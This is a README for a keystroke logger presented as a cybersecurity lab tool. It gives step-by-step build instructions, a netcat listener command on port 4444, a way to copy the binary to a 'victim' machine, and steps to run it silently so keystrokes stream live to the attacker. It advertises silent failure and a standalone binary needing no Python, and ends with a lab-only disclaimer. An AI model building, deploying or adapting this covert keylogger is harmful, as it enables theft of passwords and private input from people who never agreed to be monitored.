# Network Keystroke Monitor (Lab Edition)

A standalone keystroke logger designed for cybersecurity lab simulations.
It captures keystrokes on a victim machine and streams them to a Kali Linux listener in real time.

--------------------------------------------------

CONFIGURATION

Edit the attacker IP before building:

  nano src/main.py

Change:

  KALI_IP = "192.168.X.X"

Replace it with your Kali Linux IP.

--------------------------------------------------

BUILD INSTRUCTIONS (Developer Machine)

Install requirements and build the standalone binary:

  pip install pynput pyinstaller
  pyinstaller --onefile --clean --paths=src src/main.py

Output file:

  dist/main

--------------------------------------------------

LAB SIMULATION – HOW TO RUN (COMMANDS)

Lab setup:
- Attacker: Kali Linux
- Victim: Ubuntu / Arch Linux
- Network: Same internal / virtual network
- Port: 4444

Step 1: Attacker (Kali Linux)

Start the listener:

  nc -lvp 4444

Step 2: Transfer binary to victim

From Kali:

  scp dist/main user@VICTIM_IP:/home/user/

Step 3: Victim (Ubuntu / Arch)

Run the binary:

  cd /home/user/
  chmod +x main
  ./main

(No output is normal)

Step 4: Test

- Type on the victim machine
- Keystrokes appear live on the Kali terminal

--------------------------------------------------

FEATURES

- Single standalone ELF binary
- No Python required on victim
- Clean keystroke stream
- Silent failure if attacker is unreachable

--------------------------------------------------

DISCLAIMER

This project is for authorized educational cybersecurity lab use only.
Do NOT use on real systems or real users.
